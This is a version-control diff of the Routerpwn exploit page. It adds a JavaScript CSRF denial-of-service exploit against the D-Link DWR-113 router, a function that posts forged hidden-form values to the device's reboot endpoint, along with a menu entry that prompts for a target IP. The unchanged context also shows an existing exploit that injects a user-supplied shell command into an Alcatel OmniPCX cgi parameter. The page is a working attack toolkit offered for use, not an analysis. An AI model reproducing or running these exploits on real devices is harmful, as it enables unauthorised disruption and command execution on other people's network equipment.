@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 	<head>
-		<title>Routerpwn 1.20.238</title>
+		<title>Routerpwn 1.20.239</title>
 		<link rel="apple-touch-icon" HREF="favicon.png" />
 		<link rel="shortcut icon" HREF="favicon.ico" />
 		<meta name="apple-mobile-web-app-capable" content="yes" />
@@ -345,6 +345,20 @@ function omnipcx_mastercgicommandexec(ip)
 	cmd = prompt("Command:");
 	url = "/cgi-bin/masterCGI?ping=nomip&user=;" + encodeURI(cmd) + ";";
 	document.location="http://"+ip+url;
+}
+
+function dwr113_dos(ip)
+{
+	    ip = ip || "192.168.0.1";
+	    var form = '<input type="hidden" name="S00010002" value="test" />\
+	    <input type="hidden" name="np2" value="test" />\
+        <input type="hidden" name="N00150004" value="0" />\
+        <input type="hidden" name="N00150001" value="" />\
+        <input type="hidden" name="N00150003" value="1080" />\
+        <input type="hidden" name="_cce" value="0x80150002" />\
+        <input type="hidden" name="_sce" value="%Ssc" />\
+        <input type="submit" value="Submit request" />';
+	post('http://' + ip + '/rebo.htm', form);
 }
 
 // D-Link DIR-300, DIR-615 - Remote Command Execution
@@ -3315,9 +3329,14 @@ function belkinwpspin()
 
 <section id="DLink">
 <h2>D-Link</h2>
-<h3><a href="javascript:img('D-Link DWL 2100AP')">D-Link DAP 1150</a>, <a href="javascript:img('D-Link DWL 2100AP')">DWL 2100AP</a>, <a href="javascript:img('704P')">704P</a>, <a href="javascript:img('DIR-615')">DIR-615</a>, <a href="javascript:img('DSL-500T')">DSL-500T</a>, <a href="javascript:img('DSL-502T')">DSL-502T</a>, <a href="javascript:img('DSL-504T')">DSL-504T</a>, <a href="javascript:img('DSL-562T')">DSL-562T</a>, <a href="javascript:img('DSL-G604T')">DSL-G604T</a>, <a href="javascript:img('DWL-7000AP')">DWL-7000AP</a>, <a href="javascript:img('DWL-7100AP')">DWL-7100AP</a>, <a href="javascript:img('DNS-320')">DNS-320</a>, <a href="javascript:img('DNS-325')">DNS-325</a>, <a href="javascript:img('DSL-2750U')">DSL-2750U</a>, <a href="javascript:img('DWL-2100AP')">DWL-2100AP</a>, <a href="javascript:img('DIR-280')">DIR-280</a>, <a href="javascript:img('DSL-2740B')">DSL-2740B</a>, <a href="javascript:img('DIR-300')">DIR-300</a>, <a href="javascript:img('DAP-1320')">DAP-1320</a>, <a href="javascript:img('DIR-855L')">DIR-855L</a>, <a href="javascript:img('DIR-835')">DIR-835</a>, <a href="javascript:img('DHP-1565')">DHP-1565</a>,
+<h3><a href="javascript:img('D-Link DWL 2100AP')">D-Link DAP 1150</a>, <a href="javascript:img('D-Link DWL 2100AP')">DWL 2100AP</a>, <a href="javascript:img('704P')">704P</a>, <a href="javascript:img('DIR-615')">DIR-615</a>, <a href="javascript:img('DSL-500T')">DSL-500T</a>, <a href="javascript:img('DSL-502T')">DSL-502T</a>, <a href="javascript:img('DSL-504T')">DSL-504T</a>, <a href="javascript:img('DSL-562T')">DSL-562T</a>, <a href="javascript:img('DSL-G604T')">DSL-G604T</a>, <a href="javascript:img('DWL-7000AP')">DWL-7000AP</a>, <a href="javascript:img('DWL-7100AP')">DWL-7100AP</a>, <a href="javascript:img('DNS-320')">DNS-320</a>, <a href="javascript:img('DNS-325')">DNS-325</a>, <a href="javascript:img('DSL-2750U')">DSL-2750U</a>, <a href="javascript:img('DWL-2100AP')">DWL-2100AP</a>, <a href="javascript:img('DIR-280')">DIR-280</a>, <a href="javascript:img('DSL-2740B')">DSL-2740B</a>, <a href="javascript:img('DIR-300')">DIR-300</a>, <a href="javascript:img('DAP-1320')">DAP-1320</a>, <a href="javascript:img('DIR-855L')">DIR-855L</a>, <a href="javascript:img('DIR-835')">DIR-835</a>, <a href="javascript:img('DHP-1565')">DHP-1565</a>, <a href="javascript:img('DWR-113')">DWR-113</a> </h3>
 
- </h3>
+ <article>
+        <div>07/31/14</div>
+        <div><a href="http://packetstormsecurity.com/files/127686/D-Link-DWR-113-Cross-Site-Request-Forgery.html">[+]</a></div>
+        <div><a href="javascript:dwr113_dos">D-Link DWR-113 - DOS CSRF</a></div>
+        <div><a href="javascript:dwr113_dos" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
+</article>
 
 <article>
         <div>05/22/14</div>
